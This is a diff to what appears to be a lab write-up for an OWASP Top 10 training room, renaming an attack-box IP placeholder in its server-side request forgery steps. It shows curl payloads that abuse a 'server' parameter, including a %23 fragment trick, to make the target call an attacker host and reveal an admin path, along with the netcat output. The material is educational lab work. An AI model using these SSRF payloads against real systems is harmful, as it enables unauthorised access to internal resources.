@@ -198,8 +198,8 @@ grep 401 login-logs.txt | awk '{print $3}' | sort -u
 
   ```shell
   # MACHINE_IP = IP of owasp_top10_2021_v1.2 room machine
-  # ATTACK_MACHINE_IP = IP of your attack box (execute ifconfig to get it)
-  curl 'http://MACHINE_IP:8087/download?server=ATTACK_MACHINE_IP:8000&id=75482342'
+  # ATTACKBOX_IP = IP of your attack box
+  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000&id=75482342'
   ```
 
 * Check the netcat output on the first terminal
@@ -216,15 +216,15 @@ grep 401 login-logs.txt | awk '{print $3}' | sort -u
 
   ```shell
   # MACHINE_IP = IP of owasp_top10_2021_v1.2 room machine
-  # ATTACK_MACHINE_IP = IP of your attack box (execute ifconfig to get it)
-  curl 'http://MACHINE_IP:8087/download?server=ATTACK_MACHINE_IP:8000/admin&id=75482342'
+  # ATTACKBOX_IP = IP of your attack box
+  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000/admin&id=75482342'
   ````
 
 * Check the netcat output:
 
   ```
   GET /admin/public-docs-k057230990384293/75482342.pdf HTTP/1.1
-  Host: ATTACK_MACHINE_IP:8000
+  Host: ATTACKBOX_IP:8000
   User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
   Accept: */*
   ```
@@ -234,14 +234,14 @@ grep 401 login-logs.txt | awk '{print $3}' | sort -u
 * After a few tries, being `%23` the url encoded form of `#`, this request:
 
   ```shell
-  curl 'http://MACHINE_IP:8087/download?server=ATTACK_MACHINE_IP:8000/admin%23&id=75482342'
+  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000/admin%23&id=75482342'
   ```
 
 * Results in this netcat output:
 
   ```
   GET /admin HTTP/1.1
-  Host: ATTACK_MACHINE_IP:8000
+  Host: ATTACKBOX_IP:8000
   User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
   Accept: */*
   ```
